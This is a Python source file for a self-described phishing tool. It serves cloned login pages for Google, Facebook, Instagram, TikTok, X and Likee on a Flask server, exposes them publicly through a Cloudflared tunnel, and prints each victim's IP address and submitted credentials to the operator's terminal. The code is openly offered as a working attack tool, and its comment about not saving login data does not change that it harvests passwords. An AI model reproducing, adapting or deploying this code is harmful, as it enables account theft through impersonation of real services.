import os
import subprocess
import threading
import time
from flask import Flask, request, render_template, redirect
from datetime import datetime
from termcolor import cprint
import getpass

app = Flask(__name__)
selected_template = None

template_names = {
    "google": "Google",
    "facebook": "Facebook",
    "instagram": "Instagram",
    "tiktok": "TikTok",
    "x": "X",
    "likee": "Likee"
}

PASSWORD_FILE = "password.txt"

def load_password_from_file():
    if not os.path.exists(PASSWORD_FILE):
        cprint(f"[X] Password file '{PASSWORD_FILE}' not found!", "red")
        return None
    with open(PASSWORD_FILE, "r") as f:
        chars = [line.strip() for line in f.readlines()]
    return "".join(chars)

def slow_print(text, color="white", delay=0.0667):
    for char in text:
        cprint(char, color, end="", flush=True)
        time.sleep(delay)
    print()

def check_password():
    real_password = load_password_from_file()
    if real_password is None:
        return False
    for _ in range(3):
        entered_pass = getpass.getpass("Enter password: ")
        if entered_pass == real_password:
            cprint("[✔] Password correct!\n", "green")
            return True
        else:
            cprint("[X] Incorrect password.\n", "red")
    return False

@app.route("/", methods=["GET", "POST"])
def main_page():
    global selected_template
    if selected_template is None:
        return "No template selected."

    if request.method == "POST":
        ip = request.remote_addr
        data = request.form.to_dict()

        # Do not save login data, only print to terminal
        cprint(f"\n[+] New login attempt ({template_names[selected_template]})", "cyan")
        cprint(f"    IP: {ip}", "cyan")
        for k, v in data.items():
            cprint(f"    {k}: {v}", "yellow")

        return redirect("/")

    return render_template(f"{selected_template}.html")

def start_flask():
    app.run(host="0.0.0.0", port=5000)

def start_cloudflared():
    cprint("[*] Starting Cloudflared tunnel...", "green")
    process = subprocess.Popen(
        ["cloudflared", "tunnel", "--url", "http://localhost:5000"],
        stdout=subprocess.PIPE,
        stderr=subprocess.STDOUT,
        text=True
    )

    for line in process.stdout:
        if "https://" in line and "trycloudflare.com" in line:
            cprint(f"[✔] Public URL: {line.strip()}", "green")
            break

def select_template():
    keys = list(template_names.keys())
    while True:
        slow_print("\nAvailable Templates:\n", "cyan")
        for idx, key in enumerate(keys, 1):
            slow_print(f" {idx}. {template_names[key]}", "magenta")
        choice = input("\nSelect a template number: ").strip()
        if choice.isdigit() and 1 <= int(choice) <= len(keys):
            return keys[int(choice) - 1]
        else:
            cprint("[X] Invalid choice. Try again.\n", "red")

def show_intro():
    os.system("clear")
    slow_print("===================================", "green")
    slow_print("     YEMEN PHISHING TOOL", "green")
    slow_print("===================================\n", "green")
    slow_print("[!] Created by the Yemeni hacker.", "yellow")
    slow_print("[*] Supported Templates: Google, Facebook, Instagram, TikTok, X, Likee", "yellow")
    slow_print("[~] Initializing...", "blue")
    for _ in range(25):
        cprint("█", "white", end="", flush=True)
        time.sleep(0.05)
    print("\n")

def main():
    show_intro()

    global selected_template
    selected_template = select_template()
    slow_print(f"\n[✔] Selected: {template_names[selected_template]}\n", "cyan")

    if not check_password():
        cprint("[X] Too many failed attempts. Exiting...", "red")
        return

    flask_thread = threading.Thread(target=start_flask, daemon=True)
    flask_thread.start()

    time.sleep(3)
    start_cloudflared()

    slow_print("\n[✔] Server running. Press Ctrl+C to stop.", "green")
    while True:
        time.sleep(1)

if __name__ == "__main__":
    main()
